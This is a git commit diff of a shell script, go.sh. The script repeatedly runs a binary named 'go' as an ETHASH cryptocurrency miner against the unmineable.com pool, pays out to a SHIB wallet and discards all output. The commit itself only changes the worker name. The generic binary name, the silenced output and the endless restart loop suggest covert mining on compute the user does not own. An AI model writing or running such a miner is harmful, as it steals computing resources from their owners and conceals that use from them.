2d9d538f61efe3f6098744ead076c919a1b0e61d
juleakale <86394541+juleakale@users.noreply.github.com>
2021-06-24 23:43:32 +0800

    Update go.sh

--- go.sh
+++ go.sh
@@ -1,5 +1,5 @@
 while [ 1 ]; do
 ! chmod +x go
-! ./go --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x5ca8838fd46bb86f96dbafae55251fdaa2d2a9d0.ALPI6#xty1-fwyz >/dev/null
+! ./go --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x5ca8838fd46bb86f96dbafae55251fdaa2d2a9d0.ALPI7#xty1-fwyz >/dev/null
 sleep 10
 done
